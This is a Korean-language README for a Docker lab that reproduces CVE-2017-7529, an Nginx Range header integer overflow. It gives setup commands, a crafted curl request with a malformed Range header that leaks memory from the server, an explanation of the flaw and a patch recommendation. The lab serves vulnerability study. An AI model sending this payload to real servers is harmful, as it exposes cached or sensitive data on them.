# CVE-2017-7529-Nginx Range Header Integer Overflow

- Nginx는 고성능 웹 서버이자 리버스 프록시, 캐시 서버 등으로 널리 사용되는 오픈소스 웹 서버입니다.

- Nginx 1.13.2 이하 버전에서, 정수 오버플로우로 인해 공격자가 Range 헤더를 조작하여 원래 응답 범위를 벗어난 메모리 조각이나 민감한 정보를 유출할 수 있는 취약점이 존재합니다.
---


## Reference  
- https://www.freebuf.com/articles/web/140178.html
---

## 취약 환경 구성
- 다음 명령어를 입력하여 취약한 Nginx 환경을 시작합니다.
```sh
bash
docker compose up -d
```
- 서버가 시작되면, 브라우저에서 다음 주소로 접속할 수 있습니다:

```
arduino
http://your-ip:8080
```
- Nginx 기본 페이지 또는 커스텀 index.html 페이지가 표시됩니다.
--- 

## 취약점 재현
- curl 명령어를 이용하여 악의적인 Range 헤더 요청을 보냅니다:
```
bash
curl -v -H "Range: bytes=-9223372036854,5" http://your-ip:8080/
```

### -> 응답 본문에 페이지 일부 외에도 이상한 바이너리 데이터 또는 메모리 쓰레기가 포함될 수 있습니다.
---

## 작동 원리 요약
- 이 취약점은 Range 요청을 처리할 때 음수와 양수의 정수 계산 과정에서 오버플로우가 발생하여, 원래 의도하지 않은 메모리 영역까지 응답에 포함시키게 됩니다.
- 이를 통해 공격자는 캐시된 데이터 또는 민감 정보 일부를 추출할 수 있습니다.
---

## 결론
- 이 취약점은 단순한 HTTP 요청만으로 정보 노출(Information Disclosure) 을 유발할 수 있습니다.
- 민감한 설정 정보나 기타 유출 가능한 데이터가 포함될 경우, 심각한 보안 사고로 이어질 수 있습니다.

- 패치: Nginx 1.13.3 이상으로 업데이트 권장
---

## 참고 파일 구성 예시
```
bash

CVE-2017-7529/
├── Dockerfile
├── docker-compose.yml
├── nginx.conf
├── index.html
└── README.md  <-- 본 문서
```
